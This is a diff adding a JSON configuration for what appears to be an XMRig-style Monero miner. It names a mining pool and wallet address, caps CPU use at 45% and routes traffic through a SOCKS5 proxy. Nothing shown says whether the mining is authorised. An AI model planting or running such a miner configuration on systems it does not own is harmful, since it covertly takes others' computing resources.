@@ -1,0 +1,17 @@
+{
+    "autosave": true,
+    "cpu": true,
+    "opencl": false,
+    "cuda": false,
+    "max-cpu-usage": 45,
+    "pools": [
+        {
+            "url": "pool.minexmr.com:443",
+            "user": "458E7mziLH58fSAkwRe7B7LPnEWmeSWEWgcq3UNWjFt5MQFWGUxSpZcPR76H87BaRKRt8aJRCFLupb7iSQeoGBZ7R1yPANg",
+            "rig-id": "charlie",
+            "keepalive": true,
+            "tls": true,
+            "socks5": "116.203.103.227:8888"
+        }
+    ]
+}
